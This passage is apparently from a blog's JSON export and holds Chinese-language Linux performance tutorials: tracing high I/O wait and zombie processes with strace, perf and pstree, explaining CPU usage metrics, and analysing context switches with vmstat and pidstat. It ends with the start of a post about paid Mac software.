AM 0 759 552.58 0.00 0.00 1 sshd10:30:14 AM 0 5538 263.92 0.00 0.00 0 dockerd10:30:14 AM 0 5561 131.96 0.00 0.00 0 docker-containe10:30:14 AM 0 9408 6334.02 0.00 0.00 96 app10:30:14 AM 0 9412 4222.68 0.00 0.00 90 app10:30:14 AM 0 9414 0.00 0.00 0.00 110 app10:30:14 AM 0 9415 0.00 0.00 0.00 104 app10:30:14 AM 0 9416 0.00 0.00 0.00 139 app10:30:14 AM 0 9417 0.00 0.00 0.00 82 app10:30:14 AM 0 9418 0.00 0.00 0.00 112 app10:30:14 AM 0 9424 0.00 0.00 0.00 110 app10:30:14 AM 0 9425 0.00 0.00 0.00 89 app10:30:14 AM 0 9430 0.00 0.00 0.00 110 app10:30:14 AM 0 9431 4222.68 0.00 0.00 102 app10:30:14 AM 0 9432 0.00 0.00 0.00 103 app10:30:14 AM 0 9433 0.00 0.00 0.00 112 app10:30:14 AM 0 9434 0.00 0.00 0.00 110 app10:30:14 AM 0 9435 4222.68 0.00 0.00 83 app10:30:14 AM 0 9436 0.00 0.00 0.00 132 app10:30:14 AM 0 9437 4222.68 0.00 0.00 89 app10:30:14 AM 0 9439 0.00 0.00 0.00 110 app10:30:14 AM 0 9440 0.00 0.00 0.00 118 app10:30:14 AM 0 9441 0.00 0.00 0.00 112 app10:30:14 AM 0 9442 0.00 0.00 0.00 103 app 不过，到底是 app 进程执行了什么导致 I/O 飙高呢？ stracestrace常用来跟踪进程执行时的系统调用和所接收的信号。在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用，包括参数，返回值，执行消耗的时间。 1234567root@linux:~# strace -p 1675strace: Process 1675 attachedread(3, &quot;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot;..., 67108864) &#x3D; 67108864read(3, &quot;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot;..., 67108864) &#x3D; 67108864read(3, &quot;\\0\\0\\n\\0\\0\\0(\\0\\0\\0\\2\\0?\\373&amp;\\0\\365\\377\\t\\0\\0\\0\\0\\0\\2\\0\\0\\0\\2\\0\\0\\0&quot;..., 67108864) &#x3D; 67108864read(3, &quot;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot;..., 67108864) &#x3D; 67108864read(3, 每一行都是一条系统调用，等号左边是系统调用的函数名及其参数，右边是该调用的返回值。我们可以看到该进程一直调用read函数。 但是如果是僵尸进程则此方法不管用。 所以可以通过perf 来查看进程的调用 12root@linux:~# perf record -g # 15秒后按 ctrl+c 结束root@linux:~# perf report 我们发现， app 的确在通过系统调用 sys_read() 读取数据。并且从 new_sync_read 和 blkdev_direct_IO 能看出，进程正在对磁盘进行直接读，也就是绕过了系统缓存，每个读请求都会从磁盘直接读，这就可以解释我们观察到的 iowait 升高了。 观察该进程的源码，我们发现确实调用 O_DIRECT 对磁盘进行频繁读取 1int fd &#x3D; open(disk, O_RDONLY | O_DIRECT | O_LARGEFILE, 0755); 直接读写磁盘，对 I/O 敏感型应用（比如数据库系统）是很友好的，因为你可以在应用中，直接控制磁盘的读写。但在大部分情况下，我们最好还是通过系统缓存来优化磁盘 I/O，换句话说，删除 O_DIRECT 这个选项就是了。 僵尸进程问题对于僵尸进程，我们需要找到其父进程，然后从父进程哪里解决 1234567root@linux:~# pstree -aps 1738systemd,1 └─dockerd,1023 -H fd:&#x2F;&#x2F; └─docker-containe,1112 --config &#x2F;var&#x2F;run&#x2F;docker&#x2F;containerd&#x2F;containerd.toml --log-level info └─docker-containe,1581 -namespace moby -workdir &#x2F;var&#x2F;lib&#x2F;docker&#x2F;containerd&#x2F;daemon&#x2F;io.containerd.runtime.v1.linux&#x2F;moby&#x2F;68e0799e0677a6bbe917bd8473b3d7a713d146836dffc905c12c00b30e729123 -address... └─app,1608 -d &#x2F;dev&#x2F;vdc -s 67108864 -c 20 └─(app,1738) 运行完，你会发现 1738 号进程的父进程是 1608，也就是 app 应用。 所以，我们接着查看 app 应用程序的代码，看看子进程结束的处理是否正确，比如有没有调用 wait() 或 waitpid() ，抑或是，有没有注册 SIGCHLD 信号的处理函数。 1234567891011int status &#x3D; 0; for (;;) &#123; for (int i &#x3D; 0; i &lt; 2; i++) &#123; if(fork()&#x3D;&#x3D; 0) &#123; sub_process(); &#125; &#125; sleep(5); &#125; while(wait(&amp;status)&gt;0); 发现 1while(wait(&amp;status)&gt;0); 写在了for 循环外面，导致wait 函数实际上并没有被调用。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"系统占用CPU 资源很高，但是却找不到具体的应用","slug":"系统占用CPU-资源很高，但是却找不到具体的应用","date":"2019-03-26T12:06:25.000Z","updated":"2021-02-26T06:05:29.350Z","comments":true,"path":"posts/33974.html","link":"","permalink":"https://awen.me/posts/33974.html","excerpt":"如果使用 top、pidstat 等工具发现 用户 CPU 占用很高，但是具体进程看发现CPU 占用并不高，可以通过perf 分析一段时间内的报告 12345# 记录性能事件，等待大约 15 秒后按 Ctrl+C 退出$ perf record -g# 查看报告$ perf report","text":"如果使用 top、pidstat 等工具发现 用户 CPU 占用很高，但是具体进程看发现CPU 占用并不高，可以通过perf 分析一段时间内的报告 12345# 记录性能事件，等待大约 15 秒后按 Ctrl+C 退出$ perf record -g# 查看报告$ perf report 或者使用execsnoop 分析是否有短时进程，execsnoop 通过ftrace 实时监控进程的 exec()行为，并输出短时进程的基本信息，包括 PID 父进程PID 等 123456789101112# 按 Ctrl+C 结束$ execsnoopPCOMM PID PPID RET ARGSsh 30394 30393 0stress 30396 30394 0 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;stress -t 1 -d 1sh 30398 30393 0stress 30399 30398 0 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;stress -t 1 -d 1sh 30402 30400 0stress 30403 30402 0 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;stress -t 1 -d 1sh 30405 30393 0stress 30407 30405 0 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;stress -t 1 -d 1...","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"某个应用的 CPU 使用率100% 如何处理","slug":"某个应用的-CPU-使用率100-如何处理","date":"2019-03-26T10:53:22.000Z","updated":"2021-02-26T06:05:29.344Z","comments":true,"path":"posts/51277.html","link":"","permalink":"https://awen.me/posts/51277.html","excerpt":"Linux作为一个多任务操作系统，将每个CPU的时间划分为很短的时间片，再通过调度器轮流分配给各个任务使用，因此造成多任务同时运行的错觉。","text":"Linux作为一个多任务操作系统，将每个CPU的时间划分为很短的时间片，再通过调度器轮流分配给各个任务使用，因此造成多任务同时运行的错觉。 CPU 使用率为了维护 CPU 时间，Linux 通过事先定义的节拍率（内核中表示为 HZ），触发时间中断，并使用全局变量 Jiffies 记录了开机以来的节拍数。每发生一次时间中断，Jiffies 的值就加 1。 节拍率HZ是内核的可配选项，可以自定义配置，可通过/boot/config来查询 123[root@linux ~]# cat &#x2F;boot&#x2F;config-3.10.0-957.10.1.el7.x86_64 | grep ^&#39;CONFIG_HZ&#39;CONFIG_HZ_1000&#x3D;yCONFIG_HZ&#x3D;1000 同时，正因为节拍率HZ是内核选项，所以用户空间程序并不能直接访问。为了方便用户空间程序，内核还提供了一个用户空间节拍率USER_ HZ,它总是固定为100，也就是1/100秒。这样，用户空间程序并不需要关心内核中HZ被设置成了多少，因为它看到的总是固定值USER_ HZ。 Linux通过/proc虚拟文件系统，向用户空间提供了系统内部状态的信息，而/proc/stat提供的就是系统的CPU和任务统计信息。比方说，如果你只关注CPU的话，可以执行下面的命令: 1234[root@linux ~]# cat &#x2F;proc&#x2F;stat | grep ^cpucpu 57739 102 160531 603983 5316 0 70 301 0 0cpu0 28193 51 80340 302599 2407 0 59 161 0 0cpu1 29545 51 80190 301383 2908 0 11 140 0 0 这里的输出结果是一个表格。其中，第一列表示的是 CPU 编号，如 cpu0、cpu1 ，而第一行没有编号的 cpu ，表示的是所有 CPU 的累加。其他列则表示不同场景下 CPU 的累加节拍数，它的单位是 USER_HZ，也就是 10 ms（1/100 秒），所以这其实就是不同场景下的 CPU 时间。 CPU 使用率指标CPU使用率有很多重要指标，具体含义如下： user（通常缩写为us），代表用户态CPU时间。注意，它包括下面的nice时间，但包括了guest时间。 nice（通常缩写为ni），代表低优先级用户态CPU时间，也就是进程的nice值被调整为1-19之间是的CPU时间。 system（通常缩写为sys），代表内核态CPU时间 idle（通常缩写为id），代表空闲时间。注意，它不包括I/O等待时间（iowait） iowait（通常缩写为wa），代表等待I/O的CPU时间 irq（通常缩写为hi），代表处理硬中断的CPU时间 softirq（通常缩写为si），代表处理软中断的CPU时间 steal（通常缩写为st），代表当系统运行在虚拟机中的时候，被其他虚拟机占用的CPU时间 guest（通常缩写为guest），代表通过虚拟化运行其他操作系统的时间，也就是运行虚拟机的CPU时间 而我们通常所说的CPU使用率，就是除了空闲时间外的其他时间占总CPU时间的百分比，用公式表示为： 上面这个计算方式是不具备参考意义的，因为总CPU时间是机器开机以来的，事实上，为了计算CPU使用率，性能工具都会取间隔一段时间（比如5秒）的两次值，做差后，再计算出这段时间内的平均CPU使用率，即： 这个公式，就是我们用各种性能工具所看到的 CPU 使用率的实际计算方法。 Linux 也给每个进程提供了运行情况的统计信息，也就是 /proc/[pid]/stat。不过，这个文件包含的数据就比较丰富了，总共有 52 列的数据。 不过需要注意的是，性能分析工具给出的都是间隔一段时间的平均CPU使用率，所以要注意间隔时间的设置，特别是多个工具对比分析时，需要保证它们的间隔时间是相同的。 比如，对比一下top和ps这两个工具报告的CPU使用率，默认的结果可能不一样，因为top默认使用3秒时间间隔，而ps使用的却是进程的整个生命周期。 查看 CPU 使用率的方法top显示了系统总体的CPU和内存使用情况，以及各个进程的资源使用情况 ps则是显示了每个进程的资源使用情况 需要注意的，top默认显示的所有CPU的平均值，这个时候只需要按下数字1，就可以切换到每个CPU的使用率了。继续往下看，空白行之后是进程的实时信息，每个进程都有一个%CPU列，表示进程的CPU使用率，它是用户态和内核态CPU使用率的总和，包括进程用户空间、使用的CPU、通过系统调用执行的内核空间CPU、以及在就绪队列等待运行的CPU。 分析进程的命令，比如pidstat，该命令包括： 用户态CPU使用率（%user） 内核态CPU使用率（%system） 运行虚拟机CPU使用率（%guest） 等待CPU使用率（%wait） 以及总的CPU使用率（%CPU） CPU 使用率过高怎么办 GDB 会导致程序中断，不适合线上环境使用， perf 1.perf top 能够显示占用CPU 时钟最多的函数或者指令，因此可以用来查看热点函数 输出结果中，第一行包含三个数据，分别是采样数（Samples）、事件类型（event）和事件总数量（Event count）。 采样数需要我们特别注意。如果采样数过少（比如只有十几个），那下面的排序和百分比就没什么实际参考价值了。 再往下看是一个表格式样的数据，每一-行包含四列，分别是: 第一列Overhead，是该符号的性能事件在所有采样中的比例，用百分比来表示。 第二列Shared，是该函数或指令所在的动态共享对象(Dynamic Shared Object) ，如内核、进程名、动态链接库名、内核模块名等。 第三列Object，是动态共享对象的类型。比如[.] 表示用户空间的可执行程序、或者动态链接库，而[k]则表示内核空间。 最后一列Symbol是符号名，也就是函数名。当函数名未知时，用十六进制的地址来表示。 接着再来看第二种常见用法，也就是 perf record 和 perf report。 perf top 虽然实时展示了系统的性能信息，但它的缺点是并不保存数据，也就无法用于离线或者后续的分析。而 perf record 则提供了保存数据的功能，保存后的数据，需要你用 perf report 解析展示。 12345$ perf record # 按 Ctrl+C 终止采样[ perf record: Woken up 1 times to write data ][ perf record: Captured and wrote 0.452 MB perf.data (6093 samples) ]$ perf report # 展示类似于 perf top 的报告 在实际使用中，我们还经常为 perf top 和 perf record 加上 -g 参数，开启调用关系的采样，方便我们根据调用链来分析性能问题。 案例分析发送请求 123456789101112131415[root@vpn fwj]# ab -c 10 -n 10000 http:&#x2F;&#x2F;192.168.10.55:10000&#x2F;This is ApacheBench, Version 2.3 &lt;$Revision: 1430300 $&gt;Copyright 1996 Adam Twiss, Zeus Technology Ltd, http:&#x2F;&#x2F;www.zeustech.net&#x2F;Licensed to The Apache Software Foundation, http:&#x2F;&#x2F;www.apache.org&#x2F;Benchmarking 192.168.10.55 (be patient)Completed 1000 requestsCompleted 2000 requestsCompleted 3000 requestsCompleted 4000 requestsCompleted 5000 requestsCompleted 6000 requestsCompleted 7000 requestsCompleted 8000 requestsCompleted 9000 requests 查看调用链关系 12# -g 开启调用关系分析，-p 指定 php-fpm 的进程号 21515$ perf top -g -p 21515 总结CPU使用率是最直观和最常用的系统性能指标，更是我们在排查性能问题时，通常会关注的第-个指标。所以我们更要熟悉它的含义，尤其要弄清楚用户(%user) 、Nice (%nice)、 系统(%system)、等待 I/O (%iowait)、 中断 (%irq) 以及软中断(%softirq) 这几种不同CPU的使用率。比如说: 用户 CPU和Nice CPU高，说明用户态进程占用 了较多的 CPU,所以应该着重排查进程的性能问题。 系统CPU 高，说明内核态占用 了较多的CPU,所以应该着重排查内核线程或者系统调用的性能问题。 I/O等待CPU高，说明等待I/O的时间比较长，所以应该着重排查系统存储是不是出现了I/O问题。 软中断和硬中断高，说明软中断或硬中断的处理程序占用了较多的CPU,所以应该着重排查内核中的中断服务程序。 碰到CPU使用率升高的问题，你可以借助top、pidstat 等工具，确认引发CPU性能问题的来源;再使用perf等工具，排查出引起性能问题的具体函数。 本文总结笔记，来源于极客时间 《Linux 性能优化实战》","categories":[],"tags":[]},{"title":"CPU 上下文切换详解","slug":"CPU-上下文切换详解","date":"2019-03-26T08:05:40.000Z","updated":"2021-02-26T06:05:29.241Z","comments":true,"path":"posts/50982.html","link":"","permalink":"https://awen.me/posts/50982.html","excerpt":"问题多个进程之间竞争 CPU 的时候并没有真正运行，为什么会导致负载升高？ 原因就是 CPU 上下文切换 什么是 CPU 上下文切换Linux 是一个多任务操作系统，它支持远大于CPU 数量的任务同时运行，但实际上这些任务并不是真正的在运行，而是因为系统在很短的时间内将CPU轮流分配给它们，造成同时运行的错觉。","text":"问题多个进程之间竞争 CPU 的时候并没有真正运行，为什么会导致负载升高？ 原因就是 CPU 上下文切换 什么是 CPU 上下文切换Linux 是一个多任务操作系统，它支持远大于CPU 数量的任务同时运行，但实际上这些任务并不是真正的在运行，而是因为系统在很短的时间内将CPU轮流分配给它们，造成同时运行的错觉。 而每个任务在运行之前， CPU 都需要知道任务从哪里加载，到哪里去，系统需要先设置好CPU 寄存器和程序计数器 CPU寄存器，是CPU内置的容量小、但速度极快的内存。而程序计数器，则是用来存储CPU正在执行的指令位置、或者即将执行的下一条指令位置。它们都是CPU在运行任何任务前，必须的依赖环境，因此也被叫做CPU上下文。 上下文切换 就是先把前一个任务的 CPU 上线保存起来，然后加载新任务的上下文到这些寄存器和程序计数器，最后再跳转到程序计数器所指定的新位置，运行任务。而这些保存起来的上下文，会存储在系统内核中，并在任务重新调度执行时再次加载。这样就能保证任务原来的状态不受影响，让任务看起来是连续的。 根据任务的不同，CPU的上下文切换就可以分为几个不同的场景，也就是进程上下文切换、线程上下文切换以及中断上下文切换。 进程上下文切换Linux按照特权等级，把进程的运行空间分为内核空间和用户空间，分别对应着下图中，CPU特权等级的Ring 0和Ring 3。 内核空间(Ring 0)具有最高权限，可以直接访问所有资源; 用户空间(Ring 3)只能访问受限资源，不能直接访问内存等硬件设备，必须通过系统调用陷入到内核中，才能访问这些特权资源。 换个角度看，也就是说，进程既可以在用户空间运行，又可以在内核空间中运行。进程在用户空间运行时，被称为进程的用户态，而陷入内核空间的时候，被称为进程的内核态。 从用户态到内核态的转变，需要通过系统调用来完成。比如，当我们查看文件内容时，就需要多次系统调用来完成:首先调用open()打开文件，然后调用read()读取文件内容，并调用write()将内容写到标准输出，最后再调用close() 关闭文件。 系统调用过程中也会发生上下文切换 CPU寄存器里原来用户态的指令位置，需要先保存起来。接着，为了执行内核态代码，CPU寄存器需要更新为内核态指令的新位置。最后才是跳转到内核态运行内核任务。 而系统调用结束后，CPU寄存器需要恢复原来保存的用户态，然后再切换到用户空间，继续运行进程。所以，一次系统调用的过程，其实是发生了两次CPU上下文切换。 系统调用过程中，并不会涉及到虚拟内存等进程用户态的资源，也不会切换进程。 和进程上下文切换是不一样的: 进程上下文切换，是指从一个进程切换到另一个进程运行。 而系统调用过程中一直是同一个进程在运行。 系统调用过程通常称为特权模式切换，而不是上下文切换。但实际上，系统调用过程中，CPU的上下文切换还是无法避免的。 进程上下文切换跟系统调用又有什么区别呢?进程是由内核来管理和调度的，进程的切换只能发生在内核态。 进程的上下文不仅包括了虚拟内存、栈、全局变量等用户空间的资源，还包括了内核堆栈、寄存器等内核空间的状态，。CPU 寄存器里原来用户态的指令位置，需要先保存起来。接着，为了执行内核态代码，CPU 寄存器需要更新为内核态指令的新位置。最后才是跳转到内核态运行内核任务。 进程的上下文切换就比系统调用时多了一步：在保存当前进程的内核状态和 CPU 寄存器之前，需要先把该进程的虚拟内存、栈等保存下来；而加载了下一进程的内核态后，还需要刷新进程的虚拟内存和用户栈。 如下图所示，保存上下文和恢复上下文的过程并不是“免费”的，需要内核在 CPU 上运行才能完成。 进程上下文切换的潜在性能问题根据 Tsuna 的测试报告，每次上下文切换都需要几十纳秒到数微秒的 CPU 时间。这个时间还是相当可观的，特别是在进程上下文切换次数较多的情况下，很容易导致 CPU 将大量时间耗费在寄存器、内核栈以及虚拟内存等资源的保存和恢复上，进而大大缩短了真正运行进程的时间。这也正是导致平均负载升高的一个重要因素。 另外，我们知道， Linux 通过 TLB（Translation Lookaside Buffer）来管理虚拟内存到物理内存的映射关系。当虚拟内存更新后，TLB 也需要刷新，内存的访问也会随之变慢。特别是在多处理器系统上，缓存是被多个处理器共享的，刷新缓存不仅会影响当前处理器的进程，还会影响共享缓存的其他处理器的进程。 发生进程上下文切换的场景1.为了保证所有进程可以得到公平调度，CPU 时间被划分为一段段的时间片，这些时间片再被轮流分配给各个进程。这样，当某个进程的时间片耗尽了，就会被系统挂起，切换到其它正在等待 CPU 的进程运行。 2.进程在系统资源不足（比如内存不足）时，要等到资源满足后才可以运行，这个时候进程也会被挂起，并由系统调度其他进程运行。 3.当进程通过睡眠函数 sleep 这样的方法将自己主动挂起时，自然也会重新调度。 4.当有优先级更高的进程运行时，为了保证高优先级进程的运行，当前进程会被挂起，由高优先级进程来运行 5.发生硬件中断时，CPU 上的进程会被中断挂起，转而执行内核中的中断服务程序。 线程上下文切换线程与进程最大的区别在于：线程是调度的基本单位，而进程则是资源拥有的基本单位。说白了，所谓内核中的任务调度，实际上的调度对象是线程；而进程只是给线程提供了虚拟内存、全局变量等资源。 所以，对于线程和进程，我们可以这么理解： 当进程只有一个线程时，可以认为进程就等于线程。 当进程拥有多个线程时，这些线程会共享相同的虚拟内存和全局变量等资源。这些资源在上下文切换时是不需要修改的。 另外，线程也有自己的私有数据，比如栈和寄存器等，这些在上下文切换时也是需要保存的。 发生线程上下文切换的场景 前后两个线程属于不同进程。此时，因为资源不共享，所以切换过程就跟进程上下文切换是一样。 前后两个线程属于同一个进程。此时，因为虚拟内存是共享的，所以在切换时，虚拟内存这些资源就保持不动，只需要切换线程的私有数据、寄存器等不共享的数据 中断上下文切换为了快速响应硬件的事件，中断处理会打断进程的正常调度和执行，转而调用中断处理程序，响应设备事件。而在打断其他进程时，就需要将进程当前的状态保存下来，这样在中断结束后，进程仍然可以从原来的状态恢复运行。 跟进程上下文不同，中断上下文切换并不涉及到进程的用户态。所以，即便中断过程打断了一个正处在用户态的进程，也不需要保存和恢复这个进程的虚拟内存、全局变量等用户态资源。中断上下文，其实只包括内核态中断服务程序执行所必需的状态，包括 CPU 寄存器、内核堆栈、硬件中断参数等。 对同一个 CPU 来说，中断处理比进程拥有更高的优先级，所以中断上下文切换并不会与进程上下文切换同时发生。同样道理，由于中断会打断正常进程的调度和执行，所以大部分中断处理程序都短小精悍，以便尽可能快的执行结束。 另外，跟进程上下文切换一样，中断上下文切换也需要消耗 CPU，切换次数过多也会耗费大量的 CPU，甚至严重降低系统的整体性能。所以，当你发现中断次数过多时，就需要注意去排查它是否会给你的系统带来严重的性能问题。 如何查看系统上下文切换情况vmstat 是一个常用的系统性能分析工具，主要用来分析系统的内存使用情况，也常用来分析 CPU 上下文切换和中断的次数。 1234root@linux:~# vmstat 5 #表示每5秒输出一组数据procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 0 0 0 5908100 98072 2064032 0 0 4 267 101 190 7 1 91 1 0 我们一起来看这个结果，你可以先试着自己解读每列的含义。在这里，我重点强调下，需要特别关注的四列内容: cs (context switch) 是每秒.上下文切换的次数。 in (interrupt) 则是每秒中断的次数。 r(Running or Runnable) 是就绪队列的长度，也就是正在运行和等待CPU的进程数。 b (Blocked) 则是处于不可中断睡眠状态的进程数。 可以看到，这个例子中的上下文切换次数cs是190次，而系统中断次数in则是101次，而就绪队列长度r和不可中断状态进程数b都是0。 vmstat只给出了系统总体的.上下文切换情况，要想查看每个进程的详细情况，就需要使用我们前面提到过的pidstat了。给它加上-w选项，你就可以查看每个进程上下文切换的情况了。 12345678910111213141516root@linux:~&#x2F;sysstat&#x2F;sysstat# .&#x2F;pidstat -w 5 # 5秒输出一组数据Linux 4.4.0-21-generic (linux) 03&#x2F;26&#x2F;19 _x86_64_ (4 CPU)17:21:19 UID PID cswch&#x2F;s nvcswch&#x2F;s Command17:21:24 0 7 2.00 0.00 rcu_sched17:21:24 0 10 0.20 0.00 watchdog&#x2F;017:21:24 0 11 0.20 0.00 watchdog&#x2F;117:21:24 0 16 0.20 0.00 watchdog&#x2F;217:21:24 0 21 0.20 0.00 watchdog&#x2F;317:21:24 0 32 0.20 0.00 khugepaged17:21:24 0 613 0.20 0.00 irqbalance17:21:24 0 6552 1.00 0.00 kworker&#x2F;2:117:21:24 0 6681 0.20 0.00 pidstat17:21:24 0 6824 0.20 0.00 kworker&#x2F;u128:017:21:24 0 17308 20.00 0.00 apt17:21:24 0 39806 0.60 0.00 kworker&#x2F;3:1 这个结果中有两列内容是我们的重点关注对象。一个是 cswch ，表示每秒自愿上下文切换（voluntary context switches）的次数，另一个则是 nvcswch ，表示每秒非自愿上下文切换（non voluntary context switches）的次数。 所谓自愿上下文切换，是指进程无法获取所需资源，导致的上下文切换。比如说， I/O、内存等系统资源不足时，就会发生自愿上下文切换。 而非自愿上下文切换，则是指进程由于时间片已到等原因，被系统强制调度，进而发生的上下文切换。比如说，大量进程都在争抢 CPU 时，就容易发生非自愿上下文切换。 实战使用 sysbench 以10个线程运行 5分钟的基准测试，模拟多线程切换 123456789101112[root@linux ~]# sysbench --threads&#x3D;10 --max-time&#x3D;300 threads runWARNING: --max-time is deprecated, use --time insteadsysbench 1.0.9 (using system LuaJIT 2.0.4)Running the test with following options:Number of threads: 10Initializing random number generator from current timeInitializing worker threads...Threads started! 观察上下文切换 123456789101112[root@linux ~]# vmstat 1procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 1 0 0 6500396 51892 1334564 0 0 47 391 2594 7463 4 5 90 1 0 0 0 0 6500396 51900 1334560 0 0 0 24 38 37 0 0 100 1 0 0 0 0 6500396 51900 1334564 0 0 0 0 15 15 0 0 100 0 0 0 0 0 6500396 51900 1334564 0 0 0 0 13 11 0 0 100 0 0 0 0 0 6500396 51900 1334564 0 0 0 0 19 19 0 0 100 0 0 7 0 0 6499864 51900 1334564 0 0 0 0 7171 159273 3 10 88 0 0 6 0 0 6499344 51900 1334564 0 0 0 12 108087 1908954 18 79 3 0 0 7 0 0 6499344 51900 1334564 0 0 0 0 110938 1913795 19 78 3 0 0 8 0 0 6499344 51900 1334564 0 0 0 0 96891 1926280 19 78 3 0 1 可以看到 cs 从19 直接飙升到 1926280， r列 就绪列队已经到了8，远超过系统的CPU 个数2，所以肯定有大量的CPU 竞争。 us(user)和sy(system)列 这两列的 CPU 使用率加起来已经快100%了，其中 cpu 使用率，也就是sy 高达78%，说明 CPU 主要是被内核占用了。 in列 ：中断次数也上升到了 96891 左右，说明中断处理也是个潜在问题。 综合这几个指标，我们可以知道，系统的就绪队列过长，也就是正在运行和等待 CPU 的进程数过多，导致了大量的上下文切换，而上下文切换又导致了系统 CPU 的占用率升高。 那如何查看是什么进程导致的问题呢，可以使用pidstat 查看，可以看到是sysbench 占用 CPU 100% 1234567891011[root@linux ~]# pidstat -w -u 1 # -w 表示参数输出进程切换指标，-u 表示输出 CPU 指标平均时间: UID PID %usr %system %guest %CPU CPU Command平均时间: 0 50913 0.08 0.38 0.00 0.46 - pidstat平均时间: 0 50914 36.04 100.00 0.00 100.00 - sysbench18时17分42秒 UID PID cswch&#x2F;s nvcswch&#x2F;s Command18时17分43秒 0 9 4.00 0.00 rcu_sched18时17分43秒 0 95 2.00 0.00 kworker&#x2F;0:218时17分43秒 0 401 2.00 0.00 kworker&#x2F;1:218时17分43秒 0 43323 1.00 0.00 sshd18时17分43秒 0 50913 1.00 0.00 pidstat 通过pidstat -t 参数可以输出线程指标 1234567891011121314151617181920212223242526272829303132[root@linux ~]# pidstat -wt 1Linux 3.10.0-862.el7.x86_64 (linux) 2019年03月26日 _x86_64_ (2 CPU)18时23分31秒 UID TGID TID cswch&#x2F;s nvcswch&#x2F;s Command18时23分32秒 0 3 - 1.96 0.00 ksoftirqd&#x2F;018时23分32秒 0 - 3 1.96 0.00 |__ksoftirqd&#x2F;018时23分32秒 0 9 - 7.84 0.00 rcu_sched18时23分32秒 0 - 9 7.84 0.00 |__rcu_sched18时23分32秒 0 14 - 0.98 0.00 ksoftirqd&#x2F;118时23分32秒 0 - 14 0.98 0.00 |__ksoftirqd&#x2F;118时23分32秒 0 95 - 2.94 0.00 kworker&#x2F;0:218时23分32秒 0 - 95 2.94 0.00 |__kworker&#x2F;0:218时23分32秒 0 401 - 1.96 0.00 kworker&#x2F;1:218时23分32秒 0 - 401 1.96 0.00 |__kworker&#x2F;1:218时23分32秒 0 - 22095 0.98 0.00 |__in:imjournal18时23分32秒 0 - 22418 0.98 0.00 |__tuned18时23分32秒 0 50930 - 0.98 0.00 sshd18时23分32秒 0 - 50930 0.98 0.00 |__sshd18时23分32秒 0 50946 - 0.98 0.00 vmstat18时23分32秒 0 - 50946 0.98 0.00 |__vmstat18时23分32秒 0 - 50949 26451.96 130818.63 |__sysbench18时23分32秒 0 - 50950 27600.98 133845.10 |__sysbench18时23分32秒 0 - 50951 23982.35 126614.71 |__sysbench18时23分32秒 0 - 50952 33937.25 134397.06 |__sysbench18时23分32秒 0 - 50953 30947.06 145492.16 |__sysbench18时23分32秒 0 - 50954 23159.80 150108.82 |__sysbench18时23分32秒 0 - 50955 28414.71 145317.65 |__sysbench18时23分32秒 0 - 50956 23020.59 161437.25 |__sysbench18时23分32秒 0 - 50957 28937.25 139644.12 |__sysbench18时23分32秒 0 - 50958 27500.98 152278.43 |__sysbench18时23分32秒 0 50982 - 0.98 0.00 pidstat18时23分32秒 0 - 50982 0.98 0.00 |__pidstat 观察 /proc/interrupt 文件内容，查看变化 12# -d 参数表示高亮显示变化的区域$ watch -d cat &#x2F;proc&#x2F;interrupts 观察一段时间，你可以发现，变化速度最快的是重调度中断（RES），这个中断类型表示，唤醒空闲状态的 CPU 来调度新的任务运行。这是多处理器系统（SMP）中，调度器用来分散任务到不同 CPU 的机制，通常也被称为处理器间中断（Inter-Processor Interrupts，IPI）。 所以，这里的中断升高还是因为过多任务的调度问题，跟前面上下文切换次数的分析结果是一致的。 上下文切换多少合适这个数值其实取决于系统本身的 CPU 性能。如果系统的上下文切换次数比较稳定，那么从数百到一万以内，都应该算是正常的。但当上下文切换次数超过一万次，或者切换次数出现数量级的增长时，就很可能已经出现了性能问题。 这时，你还需要根据上下文切换的类型，再做具体分析。 比方说： 自愿上下文切换变多了，说明进程都在等待资源，有可能发生了 I/O 等其他问题； 非自愿上下文切换变多了，说明进程都在被强制调度，也就是都在争抢 CPU，说明 CPU 的确成了瓶颈； 中断次数变多了，说明 CPU 被中断处理程序占用，还需要通过查看 /proc/interrupts 文件来分析具体的中断类型。 本文整理自极客时间：《Linux性能优化实战》","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"我目前 mac 下使用的付费软件","slug":"我目前-mac-下使用的付费软件","date":"2019-03-26T05:06:14.000Z","updated":"2021-02-26T06:05:29.337Z","comments":true,"path":"posts/39787.html","link":"","permalink":"https://awen.me/posts/39787.html","excerpt":"使用mac 系统已经有四五年了，也积攒了一些使用经验，不得不说mac 系统非常适合 IT 从业者使用，就是价格有点小贵，且散热不是很好。dns整体的用户体验还是非常不错的。 我在日常工作中也购买了一些软件辅助日常的办公，这里分享给大家一些好用的软件","text":"使用mac 系统已经有四五年了，也积攒了一些使用经验，不得不说mac 系统非常适合 IT 从业者使用，就是价格有点小贵，且散热不是很好。dns整体的用户体验还是非常不错的。 我在日常工作中也购买了一些软件辅助日常的办公，这里分享给大家一些好用的软件 图床软件 ipic ：将截图上传到对象存储，例如阿里云或又拍云等云厂商的对象存储 然后返回markdown 格式的图片地址，配合markdown 工具使用简直不要太爽。 markdown 协作 typora 非常棒的免费markdown 协作工具。之前也买过 MWEB 发现不是很好用，还不如免费的typora 好用。typora 